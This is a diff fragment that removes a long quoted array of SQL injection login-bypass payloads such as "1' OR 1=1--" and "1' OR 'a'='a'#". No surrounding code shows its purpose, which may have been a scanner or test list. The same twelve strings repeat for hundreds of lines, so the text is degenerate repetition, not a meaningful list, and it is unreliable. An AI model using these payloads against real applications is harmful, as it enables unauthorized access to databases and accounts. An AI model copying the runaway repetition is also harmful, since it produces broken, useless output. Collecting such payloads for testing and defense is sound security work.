-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
